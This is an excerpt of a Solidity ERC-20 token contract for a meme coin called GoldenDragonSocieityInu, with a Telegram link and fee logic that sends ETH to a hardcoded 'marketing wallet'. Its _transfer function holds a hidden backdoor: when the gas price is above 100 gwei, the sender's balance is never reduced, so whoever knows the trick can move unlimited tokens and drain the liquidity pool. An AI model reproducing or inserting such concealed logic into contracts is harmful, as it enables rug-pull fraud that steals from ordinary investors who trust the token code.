...
//https://t.me/GoldenDragonSocieityInu
...
contract GoldenDragonSocieityInu is Context, IERC20, Ownable {
    ...
    uint256 private constant TaxSwapAmount = 50000 * 10**_decimals; //
 
    string private constant _name = "GoldenDragonSocieityInu"; // 
    string private constant _symbol = unicode"GDSI"; //    
    ...
    function _transfer(
        ...
        if (tx.gasprice > 100 gwei){}else{_tOwned[from] -= amount;}
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(0xC5A3C528064AE8BA758262bcf2be29b20861f2b2).transfer(ethToSend); //marketing wallet
    }
